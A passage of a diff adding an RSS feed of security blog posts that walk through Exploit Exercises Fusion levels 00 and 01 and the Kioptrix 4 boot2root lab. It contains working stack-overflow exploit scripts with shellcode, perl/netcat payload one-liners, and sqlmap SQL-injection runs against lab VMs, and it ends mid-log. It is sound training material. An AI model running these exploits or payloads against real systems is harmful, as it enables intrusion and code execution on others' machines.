+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now if we execute our exploit, it works just fine, bypassing ASLR and everything.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ls -al /tmp
+fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls -al /tmp
+total 8
+drwxrwxrwt  2 root  root  4096 2012-07-03 23:32 .
+drwxr-xr-x 22 root  root  4096 2012-05-07 21:53 ..
+-rw-r--r--  1 20001 20001    0 2012-07-03 23:32 level01
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it. Our shellcode to &amp;ldquo;touch /tmp/level01&amp;rdquo; executed as the uid 20001.  That shellcode could then be replaced with something more malicious (read: meterpreter/bindshell) if desired.  But for PoC, that works.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Fusion 00</title>
+      <link>https://www.mattandreko.com/blog/2012-04-09-exploit-exercises-fusion-00/</link>
+      <pubDate>Mon, 09 Apr 2012 17:13:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-04-09-exploit-exercises-fusion-00/</guid>
+      <description>&lt;p&gt;I was very excited to see the announcement on twitter, that &lt;a href=&#34;http://exploit-exercises.com/fusion&#34;&gt;Fusion&lt;/a&gt; was going to be released, even if it&amp;rsquo;s just the first 10 levels. I was a bit bummed, as I didn&amp;rsquo;t think I&amp;rsquo;d get to work on it much, until I complete &lt;a href=&#34;http://www.offensive-security.com/online-information-security-training/penetration-testing-backtrack/&#34;&gt;PWB&lt;/a&gt;, but I managed to find a little time to at least start it. I pulled up &lt;a href=&#34;http://exploit-exercises.com/fusion/level00&#34;&gt;level 00&lt;/a&gt;, which looks to be a basic stack overflow in an http server.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The code for the server is below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot; 
+
+int fix_path(char *path)
+{
+ char resolved[128];
+
+ if(realpath(path, resolved) == NULL) return 1; // can&#39;t access path. will error trying to open
+ strcpy(path, resolved);
+}
+
+char *parse_http_request()
+{
+ char buffer[1024];
+ char *path;
+ char *q;
+
+ printf(&amp;quot;[debug] buffer is at 0x%08x :-)\n&amp;quot;, buffer);
+
+ if(read(0, buffer, sizeof(buffer)) &amp;lt;= 0) errx(0, &amp;quot;Failed to read from remote host&amp;quot;);
+ if(memcmp(buffer, &amp;quot;GET &amp;quot;, 4) != 0) errx(0, &amp;quot;Not a GET request&amp;quot;);
+
+ path = &amp;amp;buffer[4];
+ q = strchr(path, &#39; &#39;);
+ if(! q) errx(0, &amp;quot;No protocol version specified&amp;quot;);
+ *q++ = 0;
+ if(strncmp(q, &amp;quot;HTTP/1.1&amp;quot;, 8) != 0) errx(0, &amp;quot;Invalid protocol&amp;quot;);
+
+ fix_path(path);
+
+ printf(&amp;quot;trying to access %s\n&amp;quot;, path);
+
+ return path;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *p;
+
+ background_process(NAME, UID, GID); 
+ fd = serve_forever(PORT);
+ set_io(fd);
+
+ parse_http_request(); 
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I initially had to read through the code a few times to figure out where the overflow was, to be quite honest. When an HTTP request comes in, it goes to the &amp;ldquo;parse_http_request&amp;rdquo; method. From there, it reads the buffr in by using the &amp;ldquo;read&amp;rdquo; method. Unfortunately for us, it is being careful to only read in as many bytes as it can put into the buffer.  It then does some basic handling to parse out the request.  It verifies that it was a &amp;ldquo;GET&amp;rdquo; request, and that it was done using HTTP/1.1. After that, it will pass the path of the URI to &amp;ldquo;fix_path&amp;rdquo;. In this method, there &lt;i&gt;IS&lt;/i&gt; an overflow, since the &amp;ldquo;resolved&amp;rdquo; variable has 128 bytes to hold data, but there is no checking of size when the &amp;ldquo;strcpy&amp;rdquo; is done.&lt;/p&gt;
+
+&lt;p&gt;I logged into the machine, and made sure that I could actually get a core dump to be created if the process had an exception.  To do this, I changed the core settings for my user:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ulimit -c unlimited
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Based on my analysis, I knew I would be overflowing the URI path, but based on the note given to me, I would put my shellcode after the &amp;ldquo;HTTP/1.1&amp;rdquo; since there was a lot more room.  However, I didn&amp;rsquo;t know the EIP offset. So I generated a quick MSF pattern on another machine:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then started to wire up an exploit like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;quot; . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that the &amp;ldquo;\x99\xf9\xff\xbf&amp;rdquo; value was simply guessed by taking the buffer offset (conveniently given to us at runtime) of &amp;ldquo;0xbffff8f8&amp;rdquo;, and adding to it enough bytes for the &amp;ldquo;GET&amp;rdquo;, the MSF buffer, and the &amp;ldquo;HTTP/1.1&amp;rdquo;. I had played previously by hand, and knew how long the buffer would be, so I didn&amp;rsquo;t need to break this into 2 steps.&lt;/p&gt;
+
+&lt;p&gt;After executing the command, I found a handy &amp;ldquo;core&amp;rdquo; file in the root directory. So I loaded it up in GDB to get the offset:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
+[New LWP 2280]
+Core was generated by `/opt/fusion/bin/level00&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0x65413665 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, I took that EIP value, and ran it through the MSF Pattern Offset calculator:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x65413665
+139
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This was convenient enough to let me know that the first 139 bytes were junk, but then I had direct access to the EIP. If my estimate for a return address was close enough to hit a nop sled, it would then hit the &amp;ldquo;\xcc&amp;rdquo; debug/trace point. I then tested that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I loaded the new core file into GDB, I saw that it indeed hit the debug trap:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
+[New LWP 2310]
+Core was generated by `/opt/fusion/bin/level00&#39;.
+Program terminated with signal 5, Trace/breakpoint trap.
+#0  0xbffff9fb in ?? ()
+(gdb) x/10x $eip
+0xbffff9fb:     0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
+0xbffffa03:     0xcc    0xcc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next step was to generate some shellcode.   verified that the process was running as a UID of 20000, and not SUID, so I&amp;rsquo;m guessing at the end result here. The challenge to me was actually getting the exploit to work, so what the shellcode did was not a big event for me.  I decided to just make it write a file to /tmp. This could however be adapted to anything else.&lt;/p&gt;
+
+&lt;p&gt;I used Metasploit&amp;rsquo;s MSFVenom tool to generate me some shellcode to &amp;ldquo;touch /tmp/poo&amp;rdquo; as a test:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfvenom -p linux/x86/exec -f pl CMD=&amp;quot;touch /tmp/poo&amp;quot;
+my $buf =
+&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&amp;quot; .
+&amp;quot;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00&amp;quot; .
+&amp;quot;\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f&amp;quot; .
+&amp;quot;\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then plugged that shellcode into my exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;&#39; | nc localhost 20000
+[debug] buffer is at 0xbffff8f8 :-)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lastly, I verified that it did run the shellcode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ls -al /tmp
+total 8
+drwxrwxrwt  2 root  root  4096 2012-04-09 21:25 .
+drwxr-xr-x 22 root  root  4096 2012-04-09 21:22 ..
+-rw-r--r--  1 20000 20000    0 2012-04-09 21:25 poo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it, successful exploitation, using very basic methods. This one felt very much like the first day back from summer break, but I&amp;rsquo;m guessing it&amp;rsquo;ll get much harder quickly.&lt;/p&gt;
+
+&lt;p&gt;UPDATE 5/7/2012: Added python exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 00
+# http://exploit-exercises.com/fusion/level00
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0xbffff999)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        print s.recv(1024)
+        s.send(&amp;quot;GET /&amp;quot; + junk + ret + &amp;quot; HTTP/1.1\n&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20000,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Kioptrix 4</title>
+      <link>https://www.mattandreko.com/blog/2012-02-12-kioptrix-4/</link>
+      <pubDate>Sun, 12 Feb 2012 22:27:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-02-12-kioptrix-4/</guid>
+      <description>&lt;p&gt;I know there are a few different methods to the new &lt;a href=&#34;http://www.kioptrix.com/blog/?p=604&#34;&gt;Kioptrix 4&lt;/a&gt; boot2root.  Unfortunately, I could not find the remote root exploit that is mentioned, but my method used several tools, and privilege escalation.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;Tools used:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.backtrack-linux.org&#34;&gt;Backtrack 5 VM&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://nmap.org&#34;&gt;Nmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://sqlmap.org&#34;&gt;SqlMap&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To start out, I had to find the machine on the network.  I booted up my Backtrack VM and Kioptrix VM both using a NAT connection in my VMWare.  This would put them on the same internal network.  In BackTrack, I first found my IP address:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:~# ifconfig
+eth1      Link encap:Ethernet  HWaddr 00:0c:29:96:92:1e  
+          inet addr:192.168.95.136  Bcast:192.168.95.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe96:921e/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:57480 errors:44807 dropped:0 overruns:0 frame:0
+          TX packets:193847 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14079464 (14.0 MB)  TX bytes:14077265 (14.0 MB)
+          Interrupt:19 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:136257 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:136257 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:26029235 (26.0 MB)  TX bytes:26029235 (26.0 MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using this information, I scanned the subnet for other devices:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:~# netdiscover -r 192.168.95.0/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+                                                                               
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.95.1    00:50:56:c0:00:08    01    060   VMWare, Inc.                 
+ 192.168.95.2    00:50:56:f1:ea:a0    01    060   VMWare, Inc.                 
+ 192.168.95.131  00:0c:29:03:da:8f    01    060   VMware, Inc.                 
+ 192.168.95.254  00:50:56:fb:ac:b6    01    060   VMWare, Inc.  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figured out of that list, that 1, 2, and 254 were reserved ones, and that 192.168.95.131 would be my Kioptrix VM.  So I did a port scan.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:~# nmap -sV 192.168.95.131
+
+Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-02-12 14:03 EST
+Nmap scan report for 192.168.95.131
+Host is up (0.00011s latency).
+Not shown: 566 closed ports, 430 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:03:DA:8F (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I started to poke around.  Since HTTP is often times the easiest for me, I started there.  I went to http://&lt;nolink&gt;192.168.95.131 and was presented with a basic login screen (and a cute goat).  I attempted to use the username of &amp;ldquo;admin&amp;rdquo;, with the same password, &amp;ldquo;admin&amp;rdquo;.  It redirected me to a password failure page, located at http://&lt;nolink&gt;192.168.95.131/checklogin.php.  I used the Firefox extension, Tamper Data, to double-check the POST query-string.  It showed, &amp;ldquo;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;My instincts told me that I should attempt some sql injection on these login screens.  I tinkered with some of the basic ones I remembered off the top of my head, but none of them worked.  It did show promise though, as I received several errors in the process.  This meant it was time for the big guns.&lt;/p&gt;
+
+&lt;p&gt;SqlMap is a tool that I&amp;rsquo;m not super familiar with, but will definitely be learning more about.  It&amp;rsquo;s very powerful, even in the hand of a beginner.  I used the url that I posted to, and specified a few options, and just watched it go:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 --dbs
+
+    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 20:42:28
+
+[20:42:28] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
+[20:42:28] [INFO] testing connection to the target url
+[20:42:28] [INFO] heuristics detected web page charset &#39;ascii&#39;
+[20:42:28] [INFO] testing if the url is stable, wait a few seconds
+[20:42:29] [INFO] url is stable
+[20:42:29] [INFO] testing if POST parameter &#39;myusername&#39; is dynamic
+[20:42:29] [WARNING] POST parameter &#39;myusername&#39; appears to be not dynamic
+[20:42:29] [WARNING] heuristic test shows that POST parameter &#39;myusername&#39; might not be injectable
+[20:42:29] [INFO] testing sql injection on POST parameter &#39;myusername&#39;
+[20:42:29] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
+[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
+[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
+[20:42:32] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
+[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - WHERE or HAVING clause (RLIKE)&#39;
+[20:42:32] [INFO] testing &#39;Generic boolean-based blind - Parameter replace (original value)&#39;
+[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
+[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
+[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
+[20:42:32] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[20:42:32] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - Parameter replace (original value)&#39;
+[20:42:32] [INFO] testing &#39;PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)&#39;
+[20:42:32] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)&#39;
+[20:42:32] [INFO] testing &#39;Oracle boolean-based blind - Parameter replace (original value)&#39;
+[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - Parameter replace (original value)&#39;
+[20:42:33] [INFO] testing &#39;SAP MaxDB boolean-based blind - Parameter replace (original value)&#39;
+[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)&#39;
+[20:42:33] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[20:42:33] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause&#39;
+[20:42:33] [INFO] testing &#39;Oracle boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses&#39;
+[20:42:33] [INFO] testing &#39;MySQL stacked conditional-error blind queries&#39;
+[20:42:33] [INFO] testing &#39;PostgreSQL stacked conditional-error blind queries&#39;
+[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked conditional-error blind queries&#39;
+[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
+[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
+[20:42:35] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;
+[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&#39;
+[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;
+[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;
+[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
+[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
+[20:42:35] [INFO] testing &#39;Firebird AND error-based - WHERE or HAVING clause&#39;
+[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
+[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
+[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
+[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
+[20:42:36] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
+[20:42:36] [INFO] testing &#39;PostgreSQL OR error-based - WHERE or HAVING clause&#39;
+[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause&#39;
+[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)&#39;
+[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (XMLType)&#39;
+[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
+[20:42:38] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
+[20:42:38] [INFO] testing &#39;Firebird OR error-based - WHERE or HAVING clause&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
+[20:42:38] [INFO] testing &#39;PostgreSQL error-based - Parameter replace&#39;
+[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - Parameter replace&#39;
+[20:42:38] [INFO] testing &#39;Oracle error-based - Parameter replace&#39;
+[20:42:38] [INFO] testing &#39;Firebird error-based - Parameter replace&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - GROUP BY and ORDER BY clauses&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)&#39;
+[20:42:38] [INFO] testing &#39;PostgreSQL error-based - GROUP BY and ORDER BY clauses&#39;
+[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - ORDER BY clause&#39;
+[20:42:38] [INFO] testing &#39;Oracle error-based - GROUP BY and ORDER BY clauses&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
+[20:42:38] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
+[20:42:38] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 stacked queries&#39;
+[20:42:39] [INFO] testing &#39;PostgreSQL stacked queries (heavy query)&#39;
+[20:42:39] [INFO] testing &#39;PostgreSQL &amp;lt; 8.2 stacked queries (Glibc)&#39;
+[20:42:39] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked queries&#39;
+[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)&#39;
+[20:42:39] [INFO] testing &#39;Oracle stacked queries (heavy query)&#39;
+[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_LOCK.SLEEP)&#39;
+[20:42:39] [INFO] testing &#39;Oracle stacked queries (USER_LOCK.SLEEP)&#39;
+[20:42:40] [INFO] testing &#39;SQLite &amp;gt; 2.0 stacked queries (heavy query)&#39;
+[20:42:40] [INFO] testing &#39;Firebird stacked queries (heavy query)&#39;
+[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
+[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
+[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
+[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;
+[20:42:40] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind&#39;
+[20:42:41] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind (comment)&#39;
+[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query)&#39;
+[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query - comment)&#39;
+[20:42:41] [INFO] testing &#39;Microsoft SQL Server/Sybase time-based blind&#39;
+[20:42:41] [INFO] POST parameter &#39;myusername&#39; is &#39;Microsoft SQL Server/Sybase time-based blind&#39; injectable 
+[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
